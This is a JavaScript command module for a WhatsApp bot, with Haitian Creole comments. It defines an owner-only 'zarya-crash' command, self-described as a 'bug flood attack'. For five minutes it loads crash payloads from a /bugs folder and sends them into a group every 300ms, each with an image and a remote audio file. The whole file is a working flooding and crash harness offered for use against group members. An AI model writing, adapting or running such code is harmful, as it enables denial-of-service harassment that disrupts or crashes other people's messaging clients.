const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'zarya-crash',
  desc: 'Bug flood attack for groups with image + audio/video from /bugs folder',
  category: 'bug',
  react: '💥',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX || '.';

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'zarya-crash') return;

    // Komann sa a mache sèlman nan group
    if (!m.isGroup) {
      return await bot.sendMessage(from, { text: '❌ This command works only in groups.' }, { quoted: mek });
    }

    // Check privilèj (Owner/Sudo)
    const botNumber = await bot.decodeJid(bot.user.id);
    const senderId = m.sender;
    const isSudo = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net', ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')].includes(senderId);
    if (!isSudo) {
      return await bot.sendMessage(from, { text: '*📛 THIS IS AN OWNER COMMAND*' }, { quoted: mek });
    }

    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));
    if (bugFiles.length === 0) {
      return await bot.sendMessage(from, { text: '📁 No payloads found in /bugs folder.' }, { quoted: mek });
    }

    await bot.sendMessage(from, {
      text: `🚨 Zarya-crash launched on this group\n🕒 Duration: 5min\n⚡ Delay: 300ms\n📦 Payloads: ${bugFiles.length}`,
    }, { quoted: mek });

    const endTime = Date.now() + (5 * 60 * 1000); // 5 minutes

    // Fonksyon voye imaj + videyo + mesaj nan gwoup
    async function sendAttackMessage(text) {
      // Voye imaj
      await bot.sendMessage(from, {
        image: { url: path.resolve(__dirname, '../media/1.png') },
        caption: text,
      });

      // Voye videyo/audio
      await bot.sendMessage(from, {
        audio: { url: 'https://files.catbox.moe/8e7mkq.mp4' },
        caption: '⚡ ZARYA-CRASH ATTACK ⚡',
      });
    }

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          delete require.cache[require.resolve(payloadPath)];
          let bugPayload = require(payloadPath);

          // Si export default string, adapte pou fonksyon
          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async () => msg;
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async () => msg;
          }

          if (typeof bugPayload === 'function') {
            const result = await bugPayload(m, bot);
            // Sipòte array oswa string kòm rezilta atak
            if (Array.isArray(result)) {
              for (const line of result) {
                await sendAttackMessage(`💥 ${line}\n_ZARYA-CRASH STRIKE_`);
                await new Promise(res => setTimeout(res, 300));
              }
            } else if (typeof result === 'string') {
              await sendAttackMessage(`💥 ${result}\n_ZARYA-CRASH STRIKE_`);
              await new Promise(res => setTimeout(res, 300));
            }
          }
        } catch (e) {
          console.error(`❌ Error in bug file ${file}:`, e);
        }
      }
    }

    await bot.sendMessage(from, {
      text: '✅ Zarya-crash attack finished on this group.',
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});